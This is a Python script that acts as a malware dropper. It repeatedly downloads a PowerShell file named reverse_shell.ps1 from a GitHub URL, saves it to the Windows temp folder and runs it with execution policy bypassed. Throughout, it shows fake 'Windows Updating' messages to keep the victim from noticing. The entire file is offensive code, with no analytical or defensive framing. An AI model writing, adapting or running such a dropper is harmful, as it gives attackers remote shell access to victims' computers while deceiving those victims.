import sys
# Add the directory where 'requests' is located
sys.path.insert(0, r'C:\\Python\\Lib\\site-packages')

import requests
import subprocess
import os
import time

# URL where the PowerShell script is hosted
ps_url = 'https://github.com/Issac-dev/GlitchGhost/blob/main/reverse_shell.ps1'  # Replace with the actual URL of your PowerShell script

# Fetch the PowerShell script from the server
def send_request():
    try: 
        response = requests.get(ps_url)
        if response.status_code == 200:
            ps_script = response.text
            print('Windows Updating. Do not turn off computer.')
            
            # Save the script to a .ps1 file in the temporary directory
            ps_file_path = os.path.join(os.getenv('TEMP'), 'reverse_shell.ps1')
            with open(ps_file_path, 'w') as file:
                file.write(ps_script)
            
            print('Please wait a minute, Do not turn off computer')
            
            # Run the PowerShell script from Python using subprocess
            subprocess.run(['powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', ps_file_path], shell=True)
            print('Windows Updating. Do not turn off computer.')
        else:
            print('Windows Updating..../')
    except Exception as e:
        print('Windows.....')

def main():
    while True:
        send_request()
        time.sleep(10)  # Wait for 10 minutes before the next request

if __name__ == '__main__':
    main() 